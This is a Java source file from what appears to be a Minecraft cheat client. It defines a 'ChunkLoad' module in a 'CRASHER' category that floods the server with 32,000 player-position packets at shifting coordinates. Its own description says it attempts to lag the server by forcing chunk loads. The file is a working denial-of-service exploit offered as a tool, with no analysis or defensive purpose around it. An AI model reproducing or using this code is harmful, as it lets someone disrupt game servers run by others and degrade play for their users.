package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.network.play.client.C03PacketPlayer;

public class ChunkLoadPrimitive extends PrimitiveFeature {

    public ChunkLoadPrimitive() {
        super("ChunkLoad", "Attempts to lag the server by loading chunks", ModuleCategory.CRASHER);
    }

    @Override
    public void execute(Object... objects) {
        long start = System.currentTimeMillis();
        double x = getPlayer().posX;
        double y = getPlayer().posY;
        double z = getPlayer().posZ;

        for (int j = 0; j < 32000; j++) {
            getPlayer().sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
        }

        ChatUtil.print(STR."Attempted to send 32 000 packets in the time of \{System.currentTimeMillis() - start}ms");
    }

}
